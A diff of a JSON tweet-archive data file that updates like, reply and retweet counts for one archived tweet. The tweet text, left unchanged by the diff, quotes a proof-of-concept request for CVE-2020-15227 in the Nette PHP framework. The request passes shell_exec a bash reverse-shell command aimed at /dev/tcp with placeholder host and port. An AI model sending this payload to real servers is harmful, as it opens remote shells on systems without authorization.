@@ -405,10 +405,10 @@
     "expanded_url": [
         "https://t.zsxq.com/zn2BQZr"
     ],
-    "tweetfavorites": 269,
+    "tweetfavorites": 260,
     "tweetquotes": 1,
-    "tweetreplies": 2,
-    "tweetretweets": 128,
+    "tweetreplies": 1,
+    "tweetretweets": 119,
     "tweettext": "CVE-2020-15227 PHP framework nette callback RCE\n\nPOC: /nette.micro?callback=shell_exec&amp;cmd=bash%20-i%20&gt;&amp;%20/dev/tcp/'+lhost+'/'+lport+'0&gt;&amp;1\n\nhttps://t.co/M4oEFOYZva https://t.co/TH5Iu9lFDP",
     "tweettime": "2020-10-14, 16:30:52",
     "tweeturl": "https://twitter.com/chybeta/status/1316416189527068672",
